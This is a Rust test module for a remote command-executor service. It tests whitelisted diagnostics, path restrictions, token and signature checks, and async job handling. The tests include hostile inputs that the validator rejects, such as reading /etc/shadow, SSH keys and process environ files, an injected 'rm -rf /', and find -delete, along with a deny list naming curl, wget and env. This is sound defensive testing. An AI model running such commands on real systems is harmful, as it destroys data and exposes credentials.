        assert!(validate_pipeline("head /proc/1/root/etc/passwd").is_err());
        // Normal /proc/ paths still allowed
        assert!(validate_pipeline("cat /proc/cpuinfo").is_ok());
        assert!(validate_pipeline("cat /proc/meminfo").is_ok());
    }

    #[test]
    fn path_restricted_relative_paths_allowed() {
        // Relative paths without traversal are OK (cwd is controlled)
        assert!(validate_pipeline("cat somefile.txt").is_ok());
    }

    #[test]
    fn non_path_restricted_cmds_unaffected() {
        // grep, find, ls etc. are not path-restricted — they don't read file contents
        assert!(validate_pipeline("ls /home/ubuntu").is_ok());
        assert!(validate_pipeline("find /etc -name '*.conf'").is_ok());
        assert!(validate_pipeline("grep -r pattern /var/log/").is_ok());
    }

    #[test]
    fn empty_pipe_segment_rejected() {
        assert!(validate_pipeline("ls | | grep foo").is_err());
        assert!(validate_pipeline("| ls").is_err());
    }

    #[test]
    fn timestamp_drift_check() {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        assert!(now.abs_diff(now - 60) <= MAX_TIMESTAMP_DRIFT_SECS);
        assert!(now.abs_diff(now - 600) > MAX_TIMESTAMP_DRIFT_SECS);
    }

    #[test]
    fn signed_message_format() {
        let timestamp = 1700000000u64;
        let commands = [
            "apt-get update".to_string(),
            "apt-get install -y vim".to_string(),
        ];
        let msg = format!("{}:{}", timestamp, commands.join("\n"));
        assert_eq!(msg, "1700000000:apt-get update\napt-get install -y vim");
    }

    #[test]
    fn job_id_generation() {
        let id1 = generate_job_id();
        let id2 = generate_job_id();
        assert_eq!(id1.len(), 32); // 16 bytes × 2 hex chars
        assert_ne!(id1, id2);
    }

    #[test]
    fn timeout_clamping() {
        // Default (None → uses DEFAULT)
        assert_eq!(
            DEFAULT_EXECUTE_TIMEOUT_SECS.min(MAX_EXECUTE_TIMEOUT_SECS),
            600
        );
        // Explicit within bounds
        assert_eq!(300u64.min(MAX_EXECUTE_TIMEOUT_SECS), 300);
        // Exceeds max → clamped
        assert_eq!(
            9999u64.min(MAX_EXECUTE_TIMEOUT_SECS),
            MAX_EXECUTE_TIMEOUT_SECS
        );
    }

    // ── HTTP integration tests ──────────────────────────────────────────

    use axum::body::Body;
    use axum::http::Request;
    use http_body_util::BodyExt;
    use tower::ServiceExt; // for oneshot

    const TEST_TOKEN: &str = "test-executor-token";

    fn test_app() -> Router {
        let state = Arc::new(AppState {
            diag_token: Some(TEST_TOKEN.to_string()),
            seen_signatures: tokio::sync::Mutex::new(HashMap::new()),
            verifying_key: None,
            jobs: Arc::new(RwLock::new(HashMap::new())),
            abort_handles: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        });
        Router::new()
            .route("/health", axum::routing::get(health))
            .route(
                "/api/v1/diagnostics",
                get(handle_diagnostics_get).post(handle_diagnostics),
            )
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .route("/api/v1/jobs/{id}/cancel", post(handle_job_cancel))
            .with_state(state)
    }

    fn test_app_with_key() -> (Router, ed25519_dalek::SigningKey, Arc<AppState>) {
        let mut key_bytes = [0u8; 32];
        getrandom::fill(&mut key_bytes).expect("OS RNG failed");
        let signing_key = ed25519_dalek::SigningKey::from_bytes(&key_bytes);
        let verifying_key = signing_key.verifying_key();
        let state = Arc::new(AppState {
            diag_token: Some(TEST_TOKEN.to_string()),
            seen_signatures: tokio::sync::Mutex::new(HashMap::new()),
            verifying_key: Some(verifying_key),
            jobs: Arc::new(RwLock::new(HashMap::new())),
            abort_handles: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        });
        let app = Router::new()
            .route("/health", axum::routing::get(health))
            .route(
                "/api/v1/diagnostics",
                get(handle_diagnostics_get).post(handle_diagnostics),
            )
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .route("/api/v1/jobs/{id}/cancel", post(handle_job_cancel))
            .with_state(state.clone());
        (app, signing_key, state)
    }

    async fn body_json(body: Body) -> serde_json::Value {
        let bytes = body.collect().await.unwrap().to_bytes();
        serde_json::from_slice(&bytes).unwrap()
    }

    fn sign_commands(
        signing_key: &ed25519_dalek::SigningKey,
        commands: &[String],
        timestamp: u64,
    ) -> String {
        use ed25519_dalek::Signer;
        let msg = format!("{}:{}", timestamp, commands.join("\n"));
        let sig = signing_key.sign(msg.as_bytes());
        hex::encode(sig.to_bytes())
    }

    // -- POST /api/v1/diagnostics --

    #[test]
    fn diagnostic_whitelist_has_no_secret_or_mutating_commands() {
        for cmd in [
            "env",
            "printenv",
            "apt",
            "apt-cache",
            "docker",
            "snap",
            "curl",
            "wget",
        ] {
            assert!(
                !DIAGNOSTIC_WHITELIST.contains(&cmd),
                "{cmd} must not be whitelisted"
            );
        }
        assert!(validate_pipeline("systemctl status aegis-runtime").is_ok());
        assert!(validate_pipeline("systemctl restart aegis-runtime").is_err());
        assert!(validate_pipeline("systemctl --no-pager list-units").is_ok());
        assert!(validate_pipeline("find /var/log -name '*.log' -size +100M").is_ok());
        assert!(validate_pipeline("find /opt/aegis-runtime -name '*.db' -delete").is_err());
        assert!(validate_pipeline("find /tmp -exec rm {} +").is_err());
    }

    #[test]
    fn protected_paths_are_refused_for_every_command() {
        assert!(validate_pipeline("grep -a . /opt/aegis-runtime/shared/.env").is_err());
        assert!(validate_pipeline("grep . /proc/1234/environ").is_err());
        assert!(validate_pipeline("cat /proc/self/environ").is_err());
        assert!(validate_pipeline("ls /root/.ssh").is_err());
        assert!(validate_pipeline("find / -name id_rsa").is_err());
        assert!(validate_pipeline("stat /etc/shadow").is_err());
        assert!(validate_pipeline("du -xm -d 1 /home /opt /var /tmp").is_ok());
        assert!(validate_pipeline("grep -c error /var/log/syslog").is_ok());
        assert!(
            validate_pipeline("grep error /opt/aegis-runtime/shared/notes.txt").is_err(),
            "content readers stay inside ALLOWED_READ_PATHS"
        );
    }

    #[test]
    fn bearer_token_comparison() {
        use axum::http::HeaderValue;
        let ok = HeaderValue::from_static("Bearer abc");
        let bad = HeaderValue::from_static("Bearer abd");
        let no_scheme = HeaderValue::from_static("abc");
        assert!(bearer_token_matches("abc", Some(&ok)));
        assert!(!bearer_token_matches("abc", Some(&bad)));
        assert!(!bearer_token_matches("abc", Some(&no_scheme)));
        assert!(!bearer_token_matches("abc", None));
    }

    #[tokio::test]
    async fn diagnostics_without_token_is_unauthorized_and_unconfigured_is_unavailable() {
        let app = test_app();
        let req = Request::post("/api/v1/diagnostics")
            .header("content-type", "application/json")
            .body(Body::from(r#"{"command":"uname -a"}"#))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

        let state = Arc::new(AppState {
            diag_token: None,
            seen_signatures: tokio::sync::Mutex::new(HashMap::new()),
            verifying_key: None,
            jobs: Arc::new(RwLock::new(HashMap::new())),
            abort_handles: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
        });
        let app = Router::new()
            .route(
                "/api/v1/diagnostics",
                get(handle_diagnostics_get).post(handle_diagnostics),
            )
            .with_state(state);
        let req = Request::get("/api/v1/diagnostics?command=uname")
            .header("authorization", "Bearer whatever")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
    }

    #[tokio::test]
    async fn http_post_diagnostics_ok() {
        let app = test_app();
        let req = Request::post("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .header("content-type", "application/json")
            .body(Body::from(r#"{"command":"uname -a"}"#))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = body_json(resp.into_body()).await;
        assert_eq!(body["status"], "ok");
        assert!(body["output"].as_str().unwrap().contains("Linux"));
    }

    #[tokio::test]
    async fn http_post_diagnostics_empty_command() {
        let app = test_app();
        let req = Request::post("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .header("content-type", "application/json")
            .body(Body::from(r#"{"command":""}"#))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }

    #[tokio::test]
    async fn http_post_diagnostics_forbidden_chars() {
        let app = test_app();
        let req = Request::post("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .header("content-type", "application/json")
            .body(Body::from(r#"{"command":"cat /etc/passwd; rm -rf /"}"#))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["output"].as_str().unwrap().contains("forbidden"));
    }

    #[tokio::test]
    async fn http_post_diagnostics_blocked_command() {
        let app = test_app();
        let req = Request::post("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .header("content-type", "application/json")
            .body(Body::from(r#"{"command":"rm -rf /"}"#))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(
            body["output"]
                .as_str()
                .unwrap()
                .contains("not in the diagnostic whitelist")
        );
    }

    // -- GET /api/v1/diagnostics --

    #[tokio::test]
    async fn http_get_diagnostics_ok() {
        let app = test_app();
        let req = Request::get("/api/v1/diagnostics?command=uname%20-a")
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = body_json(resp.into_body()).await;
        assert_eq!(body["status"], "ok");
        assert!(body["output"].as_str().unwrap().contains("Linux"));
    }

    #[tokio::test]
    async fn http_get_diagnostics_blocked_command() {
        let app = test_app();
        let req = Request::get("/api/v1/diagnostics?command=rm%20-rf%20/")
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn http_get_diagnostics_missing_param() {
        let app = test_app();
        let req = Request::get("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }

    #[tokio::test]
    async fn http_get_diagnostics_parity_with_post() {
        let cmd = "uptime";
        let app_get = test_app();
        let app_post = test_app();

        let get_req = Request::get(format!("/api/v1/diagnostics?command={}", cmd))
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let post_req = Request::post("/api/v1/diagnostics")
            .header("authorization", "Bearer test-executor-token")
            .header("content-type", "application/json")
            .body(Body::from(format!(r#"{{"command":"{}"}}"#, cmd)))
            .unwrap();

        let get_resp = app_get.oneshot(get_req).await.unwrap();
        let post_resp = app_post.oneshot(post_req).await.unwrap();

        assert_eq!(get_resp.status(), post_resp.status());

        let get_body = body_json(get_resp.into_body()).await;
        let post_body = body_json(post_resp.into_body()).await;

        assert_eq!(get_body["status"], post_body["status"]);
        assert_eq!(get_body["exit_code"], post_body["exit_code"]);
    }

    // -- POST /api/v1/execute (async job submission) --

    #[tokio::test]
    async fn http_execute_no_verifying_key() {
        let app = test_app();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let payload = serde_json::json!({
            "commands": ["echo hi"],
            "signature": "aa",
            "timestamp": now,
        });
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["status"].as_str().unwrap().contains("verifying key"));
    }

    #[tokio::test]
    async fn http_execute_empty_commands() {
        let app = test_app();
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(
                r#"{"commands":[],"signature":"aa","timestamp":0}"#,
            ))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["status"].as_str().unwrap().contains("command count"));
    }

    #[tokio::test]
    async fn http_execute_too_many_commands() {
        let app = test_app();
        let cmds: Vec<String> = (0..=MAX_COMMANDS).map(|i| format!("echo {}", i)).collect();
        let payload = serde_json::json!({
            "commands": cmds,
            "signature": "aa",
            "timestamp": 0,
        });
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn http_execute_stale_timestamp() {
        let (app, signing_key, _) = test_app_with_key();
        let commands = vec!["echo hi".to_string()];
        let stale_ts = 1000u64;
        let sig_hex = sign_commands(&signing_key, &commands, stale_ts);
        let payload = serde_json::json!({
            "commands": commands,
            "signature": sig_hex,
            "timestamp": stale_ts,
        });
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["status"].as_str().unwrap().contains("replay"));
    }

    #[tokio::test]
    async fn http_execute_invalid_signature() {
        let (app, _, _) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let payload = serde_json::json!({
            "commands": ["echo hi"],
            "signature": "00".repeat(64),
            "timestamp": now,
        });
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["status"].as_str().unwrap().contains("signature"));
    }

    #[tokio::test]
    async fn http_execute_bad_signature_hex() {
        let (app, _, _) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let payload = serde_json::json!({
            "commands": ["echo hi"],
            "signature": "not-valid-hex!@#$",
            "timestamp": now,
        });
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        let body = body_json(resp.into_body()).await;
        assert!(body["status"].as_str().unwrap().contains("encoding"));
    }

    #[tokio::test]
    async fn http_execute_submit_and_poll() {
        let (_, signing_key, state) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let commands = vec!["echo ASYNC_TEST_OK".to_string()];
        let sig_hex = sign_commands(&signing_key, &commands, now);
        let payload = serde_json::json!({
            "commands": commands,
            "signature": sig_hex,
            "timestamp": now,
        });

        // Submit job
        let app = Router::new()
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .with_state(state.clone());
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.clone().oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::ACCEPTED);
        let body = body_json(resp.into_body()).await;
        assert_eq!(body["status"], "accepted");
        let job_id = body["job_id"].as_str().unwrap().to_string();
        assert!(!job_id.is_empty());

        // Poll until done (echo should be instant)
        for _ in 0..20 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let poll_req = Request::get(format!("/api/v1/jobs/{}", job_id))
                .header("authorization", "Bearer test-executor-token")
                .body(Body::empty())
                .unwrap();
            let poll_resp = app.clone().oneshot(poll_req).await.unwrap();
            assert_eq!(poll_resp.status(), StatusCode::OK);
            let poll_body = body_json(poll_resp.into_body()).await;
            let status = poll_body["status"].as_str().unwrap();
            if status != "running" {
                assert_eq!(status, "completed");
                let results = poll_body["results"].as_array().unwrap();
                assert_eq!(results.len(), 1);
                assert!(
                    results[0]["stdout"]
                        .as_str()
                        .unwrap()
                        .contains("ASYNC_TEST_OK")
                );
                assert_eq!(poll_body["commands_total"], 1);
                assert_eq!(poll_body["commands_completed"], 1);
                return;
            }
        }
        panic!("job did not complete in time");
    }

    #[tokio::test]
    async fn http_execute_stops_on_failure() {
        let (_, signing_key, state) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let commands = vec!["false".to_string(), "echo SHOULD_NOT_RUN".to_string()];
        let sig_hex = sign_commands(&signing_key, &commands, now);
        let payload = serde_json::json!({
            "commands": commands,
            "signature": sig_hex,
            "timestamp": now,
        });

        let app = Router::new()
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .with_state(state.clone());

        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.clone().oneshot(req).await.unwrap();
        let body = body_json(resp.into_body()).await;
        let job_id = body["job_id"].as_str().unwrap().to_string();

        // Wait for completion
        for _ in 0..20 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let poll_req = Request::get(format!("/api/v1/jobs/{}", job_id))
                .header("authorization", "Bearer test-executor-token")
                .body(Body::empty())
                .unwrap();
            let poll_resp = app.clone().oneshot(poll_req).await.unwrap();
            let poll_body = body_json(poll_resp.into_body()).await;
            if poll_body["status"].as_str().unwrap() != "running" {
                assert_eq!(poll_body["status"], "failed");
                let results = poll_body["results"].as_array().unwrap();
                assert_eq!(results.len(), 1, "batch should stop after first failure");
                assert_ne!(results[0]["exit_code"], 0);
                return;
            }
        }
        panic!("job did not complete in time");
    }

    #[tokio::test]
    async fn http_job_not_found() {
        let (_, _, state) = test_app_with_key();
        let app = Router::new()
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .with_state(state);
        let req = Request::get("/api/v1/jobs/nonexistent")
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn http_job_cancel() {
        let (_, signing_key, state) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        // Use sleep to create a long-running job
        let commands = vec!["sleep 60".to_string()];
        let sig_hex = sign_commands(&signing_key, &commands, now);
        let payload = serde_json::json!({
            "commands": commands,
            "signature": sig_hex,
            "timestamp": now,
        });

        let app = Router::new()
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .route("/api/v1/jobs/{id}/cancel", post(handle_job_cancel))
            .with_state(state.clone());

        // Submit
        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.clone().oneshot(req).await.unwrap();
        let body = body_json(resp.into_body()).await;
        let job_id = body["job_id"].as_str().unwrap().to_string();

        // Give it a moment to start
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Cancel
        let cancel_req = Request::post(format!("/api/v1/jobs/{}/cancel", job_id))
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let cancel_resp = app.clone().oneshot(cancel_req).await.unwrap();
        assert_eq!(cancel_resp.status(), StatusCode::OK);
        let cancel_body = body_json(cancel_resp.into_body()).await;
        assert_eq!(cancel_body["status"], "cancelled");

        // Verify status is cancelled
        tokio::time::sleep(Duration::from_millis(100)).await;
        let poll_req = Request::get(format!("/api/v1/jobs/{}", job_id))
            .header("authorization", "Bearer test-executor-token")
            .body(Body::empty())
            .unwrap();
        let poll_resp = app.clone().oneshot(poll_req).await.unwrap();
        let poll_body = body_json(poll_resp.into_body()).await;
        assert_eq!(poll_body["status"], "cancelled");
    }

    #[tokio::test]
    async fn http_execute_custom_timeout() {
        let (_, signing_key, state) = test_app_with_key();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        let commands = vec!["echo timeout_test".to_string()];
        let sig_hex = sign_commands(&signing_key, &commands, now);
        let payload = serde_json::json!({
            "commands": commands,
            "signature": sig_hex,
            "timestamp": now,
            "timeout_secs": 300,
        });

        let app = Router::new()
            .route("/api/v1/execute", post(handle_execute))
            .route("/api/v1/jobs/{id}", get(handle_job_status))
            .with_state(state.clone());

        let req = Request::post("/api/v1/execute")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_vec(&payload).unwrap()))
            .unwrap();
        let resp = app.clone().oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::ACCEPTED);
        let body = body_json(resp.into_body()).await;
        let job_id = body["job_id"].as_str().unwrap().to_string();

        // Wait and check timeout_secs is reflected
        for _ in 0..20 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let poll_req = Request::get(format!("/api/v1/jobs/{}", job_id))
                .header("authorization", "Bearer test-executor-token")
                .body(Body::empty())
                .unwrap();
            let poll_resp = app.clone().oneshot(poll_req).await.unwrap();
            let poll_body = body_json(poll_resp.into_body()).await;
            if poll_body["status"].as_str().unwrap() != "running" {
                assert_eq!(poll_body["timeout_secs"], 300);
                return;
            }
        }
        panic!("job did not complete in time");
    }
}
